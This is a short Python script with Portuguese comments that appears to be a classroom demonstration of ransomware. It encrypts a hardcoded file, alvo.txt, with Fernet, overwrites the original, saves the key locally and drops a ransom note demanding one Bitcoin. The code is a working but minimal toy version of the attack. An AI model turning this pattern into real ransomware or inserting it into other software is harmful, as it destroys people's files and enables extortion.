from cryptography.fernet import Fernet
import os

# 1. O vilão cria a "chave" do cadeado
chave = Fernet.generate_key()
with open("chave.key", "wb") as arquivo_chave:
    arquivo_chave.write(chave)

# 2. O vilão acha o arquivo da vítima e lê o que tem dentro
with open("alvo.txt", "rb") as arquivo_vitima:
    conteudo_original = arquivo_vitima.read()

# 3. O vilão embaralha (criptografa) o conteúdo
conteudo_trancado = Fernet(chave).encrypt(conteudo_original)

# 4. O vilão sobrescreve o arquivo original com o conteúdo trancado
with open("alvo.txt", "wb") as arquivo_vitima:
    arquivo_vitima.write(conteudo_trancado)

# 5. O vilão deixa o bilhete de resgate!
with open("RESGATE.txt", "w") as bilhete:
    bilhete.write("ATENCAO! Seus arquivos foram trancados. Pague 1 Bitcoin para receber a chave!")

print("Ataque concluido! O arquivo alvo.txt foi trancado.")
